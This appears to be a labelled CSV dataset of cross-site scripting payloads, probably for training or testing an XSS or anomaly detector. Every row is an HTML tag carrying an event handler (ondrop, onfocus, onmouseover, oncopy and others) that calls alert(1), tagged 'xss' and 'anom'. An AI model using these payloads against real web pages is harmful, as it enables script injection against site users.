payload,length,attack_type,label
"<div draggable=""true"" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable>drop here</tr>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable>drop here</tt>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",99,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>",103,xss,anom
"<div draggable=""true"" ondrag=""alert(1)"">test</div>",50,xss,anom
"<div draggable=""true"" ondragend=""alert(1)"">test</div>",53,xss,anom
"<div draggable=""true"" ondragenter=""alert(1)"">test</div>",55,xss,anom
"<div draggable=""true"" ondragleave=""alert(1)"">test</div>",55,xss,anom
"<div draggable=""true"" ondragstart=""alert(1)"">test</div>",55,xss,anom
<div id=x tabindex=1 onactivate=alert(1)></div>,47,xss,anom
<div id=x tabindex=1 onbeforeactivate=alert(1)></div>,53,xss,anom
<div id=x tabindex=1 onbeforedeactivate=alert(1)></div><input autofocus>,72,xss,anom
<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>,71,xss,anom
<div id=x tabindex=1 onfocus=alert(1)></div>,44,xss,anom
<div id=x tabindex=1 onfocusin=alert(1)></div>,46,xss,anom
"<div onbeforecopy=""alert(1)"" contenteditable>test</div>",55,xss,anom
"<div onbeforecut=""alert(1)"" contenteditable>test</div>",54,xss,anom
"<div onbeforepaste=""alert(1)"" contenteditable>test</div>",56,xss,anom
<div onblur=alert(1) tabindex=1 id=x></div><input autofocus>,60,xss,anom
"<div onclick=""alert(1)"">test</div>",34,xss,anom
"<div oncontextmenu=""alert(1)"">test</div>",40,xss,anom
"<div oncopy=""alert(1)"" contenteditable>test</div>",49,xss,anom
"<div oncut=""alert(1)"" contenteditable>test</div>",48,xss,anom
"<div ondblclick=""alert(1)"">test</div>",37,xss,anom
<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>,64,xss,anom
"<div onkeydown=""alert(1)"" contenteditable>test</div>",52,xss,anom
"<div onkeypress=""alert(1)"" contenteditable>test</div>",53,xss,anom
"<div onkeyup=""alert(1)"" contenteditable>test</div>",50,xss,anom
"<div onmousedown=""alert(1)"">test</div>",38,xss,anom
"<div onmouseenter=""alert(1)"">test</div>",39,xss,anom
"<div onmouseleave=""alert(1)"">test</div>",39,xss,anom
"<div onmousemove=""alert(1)"">test</div>",38,xss,anom
"<div onmouseout=""alert(1)"">test</div>",37,xss,anom
"<div onmouseover=""alert(1)"">test</div>",38,xss,anom
"<div onmouseup=""alert(1)"">test</div>",36,xss,anom
"<div onpaste=""alert(1)"" contenteditable>test</div>",50,xss,anom
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",48,xss,anom
"<dl draggable=""true"" ondragend=""alert(1)"">test</dl>",51,xss,anom
"<dl draggable=""true"" ondragenter=""alert(1)"">test</dl>",53,xss,anom
"<dl draggable=""true"" ondragleave=""alert(1)"">test</dl>",53,xss,anom
"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",53,xss,anom
<dl id=x tabindex=1 onactivate=alert(1)></dl>,45,xss,anom
<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>,51,xss,anom
<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>,70,xss,anom
<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>,69,xss,anom
<dl id=x tabindex=1 onfocus=alert(1)></dl>,42,xss,anom
<dl id=x tabindex=1 onfocusin=alert(1)></dl>,44,xss,anom
"<dl onbeforecopy=""alert(1)"" contenteditable>test</dl>",53,xss,anom
"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>",52,xss,anom
"<dl onbeforepaste=""alert(1)"" contenteditable>test</dl>",54,xss,anom
<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>,58,xss,anom
"<dl onclick=""alert(1)"">test</dl>",32,xss,anom
"<dl oncontextmenu=""alert(1)"">test</dl>",38,xss,anom
"<dl oncopy=""alert(1)"" contenteditable>test</dl>",47,xss,anom
"<dl oncut=""alert(1)"" contenteditable>test</dl>",46,xss,anom
"<dl ondblclick=""alert(1)"">test</dl>",35,xss,anom
<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>,62,xss,anom
"<dl onkeydown=""alert(1)"" contenteditable>test</dl>",50,xss,anom
"<dl onkeypress=""alert(1)"" contenteditable>test</dl>",51,xss,anom
"<dl onkeyup=""alert(1)"" contenteditable>test</dl>",48,xss,anom
"<dl onmousedown=""alert(1)"">test</dl>",36,xss,anom
"<dl onmouseenter=""alert(1)"">test</dl>",37,xss,anom
"<dl onmouseleave=""alert(1)"">test</dl>",37,xss,anom
"<dl onmousemove=""alert(1)"">test</dl>",36,xss,anom
"<dl onmouseout=""alert(1)"">test</dl>",35,xss,anom
"<dl onmouseover=""alert(1)"">test</dl>",36,xss,anom
"<dl onmouseup=""alert(1)"">test</dl>",34,xss,anom
"<dl onpaste=""alert(1)"" contenteditable>test</dl>",48,xss,anom
"<dt draggable=""true"" ondrag=""alert(1)"">test</dt>",48,xss,anom
"<dt draggable=""true"" ondragend=""alert(1)"">test</dt>",51,xss,anom
"<dt draggable=""true"" ondragenter=""alert(1)"">test</dt>",53,xss,anom
"<dt draggable=""true"" ondragleave=""alert(1)"">test</dt>",53,xss,anom
"<dt draggable=""true"" ondragstart=""alert(1)"">test</dt>",53,xss,anom
<dt id=x tabindex=1 onactivate=alert(1)></dt>,45,xss,anom
<dt id=x tabindex=1 onbeforeactivate=alert(1)></dt>,51,xss,anom
<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>,70,xss,anom
<dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>,69,xss,anom
<dt id=x tabindex=1 onfocus=alert(1)></dt>,42,xss,anom
<dt id=x tabindex=1 onfocusin=alert(1)></dt>,44,xss,anom
"<dt onbeforecopy=""alert(1)"" contenteditable>test</dt>",53,xss,anom
"<dt onbeforecut=""alert(1)"" contenteditable>test</dt>",52,xss,anom
"<dt onbeforepaste=""alert(1)"" contenteditable>test</dt>",54,xss,anom
<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>,58,xss,anom
"<dt onclick=""alert(1)"">test</dt>",32,xss,anom
"<dt oncontextmenu=""alert(1)"">test</dt>",38,xss,anom
"<dt oncopy=""alert(1)"" contenteditable>test</dt>",47,xss,anom
"<dt oncut=""alert(1)"" contenteditable>test</dt>",46,xss,anom
"<dt ondblclick=""alert(1)"">test</dt>",35,xss,anom
<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>,62,xss,anom
"<dt onkeydown=""alert(1)"" contenteditable>test</dt>",50,xss,anom
"<dt onkeypress=""alert(1)"" contenteditable>test</dt>",51,xss,anom
"<dt onkeyup=""alert(1)"" contenteditable>test</dt>",48,xss,anom
"<dt onmousedown=""alert(1)"">test</dt>",36,xss,anom
"<dt onmouseenter=""alert(1)"">test</dt>",37,xss,anom
"<dt onmouseleave=""alert(1)"">test</dt>",37,xss,anom
"<dt onmousemove=""alert(1)"">test</dt>",36,xss,anom
"<dt onmouseout=""alert(1)"">test</dt>",35,xss,anom
"<dt onmouseover=""alert(1)"">test</dt>",36,xss,anom
"<dt onmouseup=""alert(1)"">test</dt>",34,xss,anom
"<dt onpaste=""alert(1)"" contenteditable>test</dt>",48,xss,anom
"<element draggable=""true"" ondrag=""alert(1)"">test</element>",58,xss,anom
"<element draggable=""true"" ondragend=""alert(1)"">test</element>",61,xss,anom
"<element draggable=""true"" ondragenter=""alert(1)"">test</element>",63,xss,anom
"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",63,xss,anom
"<element draggable=""true"" ondragstart=""alert(1)"">test</element>",63,xss,anom
<element id=x tabindex=1 onactivate=alert(1)></element>,55,xss,anom
<element id=x tabindex=1 onbeforeactivate=alert(1)></element>,61,xss,anom
<element id=x tabindex=1 onbeforedeactivate=alert(1)></element><input autofocus>,80,xss,anom
<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>,79,xss,anom
<element id=x tabindex=1 onfocus=alert(1)></element>,52,xss,anom
<element id=x tabindex=1 onfocusin=alert(1)></element>,54,xss,anom
"<element onbeforecopy=""alert(1)"" contenteditable>test</element>",63,xss,anom
"<element onbeforecut=""alert(1)"" contenteditable>test</element>",62,xss,anom
"<element onbeforepaste=""alert(1)"" contenteditable>test</element>",64,xss,anom
<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>,68,xss,anom
"<element onclick=""alert(1)"">test</element>",42,xss,anom
"<element oncontextmenu=""alert(1)"">test</element>",48,xss,anom
"<element oncopy=""alert(1)"" contenteditable>test</element>",57,xss,anom
"<element oncut=""alert(1)"" contenteditable>test</element>",56,xss,anom
"<element ondblclick=""alert(1)"">test</element>",45,xss,anom
<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>,72,xss,anom
"<element onkeydown=""alert(1)"" contenteditable>test</element>",60,xss,anom
"<element onkeypress=""alert(1)"" contenteditable>test</element>",61,xss,anom
"<element onkeyup=""alert(1)"" contenteditable>test</element>",58,xss,anom
"<element onmousedown=""alert(1)"">test</element>",46,xss,anom
"<element onmouseenter=""alert(1)"">test</element>",47,xss,anom
"<element onmouseleave=""alert(1)"">test</element>",47,xss,anom
"<element onmousemove=""alert(1)"">test</element>",46,xss,anom
"<element onmouseout=""alert(1)"">test</element>",45,xss,anom
"<element onmouseover=""alert(1)"">test</element>",46,xss,anom
